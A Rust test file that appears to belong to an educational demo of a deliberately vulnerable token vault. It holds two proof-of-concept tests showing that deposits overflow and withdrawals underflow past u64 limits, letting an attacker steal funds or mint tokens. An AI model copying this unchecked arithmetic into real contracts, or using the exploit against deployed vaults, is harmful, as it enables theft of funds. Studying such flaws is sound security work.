// Test file for Vulnerable Version: Arithmetic Overflow
// This test demonstrates that the exploit WORKS

#[tokio::test]
async fn test_overflow_exploit() {
    println!("\n=== EXPLOIT: Arithmetic Overflow ===\n");
    
    let vault = Keypair::new();
    initialize_vault(&vault).await.unwrap();
    
    // Setup: Vault near maximum balance
    println!("1. Setting up vault near u64::MAX");
    let near_max = u64::MAX - 100;
    set_balance(&vault, near_max).await;
    println!("   Balance: {}", near_max);
    
    // Exploit: Deposit causes overflow
    println!("\n2. Depositing 200 tokens (causes overflow)");
    let result = deposit(&vault, 200).await;
    
    // In vulnerable version: SUCCEEDS (wraps around)
    assert!(result.is_ok(), "Overflow should succeed in vulnerable version");
    
    let new_balance = get_balance(&vault).await;
    println!("\n  EXPLOIT SUCCESSFUL!");
    println!("   ✗ Balance overflowed");
    println!("   ✗ {} + 200 = {}", near_max, new_balance);
    println!("   ✗ Balance wrapped to small number");
    
    assert!(new_balance < 200, "Balance should have wrapped");
    
    // Now attacker can withdraw everything
    println!("\n3. Attacker withdraws more than they deposited");
    withdraw(&vault, 1000).await.unwrap();
    
    println!("\n Attacker exploited overflow to steal funds");
}

#[tokio::test]
async fn test_underflow_exploit() {
    println!("\n=== EXPLOIT: Arithmetic Underflow ===\n");
    
    let vault = Keypair::new();
    initialize_vault(&vault).await.unwrap();
    
    // Setup: Small balance
    deposit(&vault, 100).await.unwrap();
    println!("1. Vault balance: 100 tokens");
    
    // Exploit: Withdraw more than balance
    println!("\n2. Withdrawing 200 tokens (causes underflow)");
    let result = withdraw(&vault, 200).await;
    
    // In vulnerable version: SUCCEEDS (wraps around)
    assert!(result.is_ok(), "Underflow should succeed in vulnerable version");
    
    let new_balance = get_balance(&vault).await;
    println!("\n  EXPLOIT SUCCESSFUL!");
    println!("   ✗ 100 - 200 = {}", new_balance);
    println!("   ✗ Balance underflowed to huge number");
    
    assert!(new_balance > u64::MAX / 2, "Balance should have underflowed");
    
    println!("\n Attacker created tokens from nothing");
}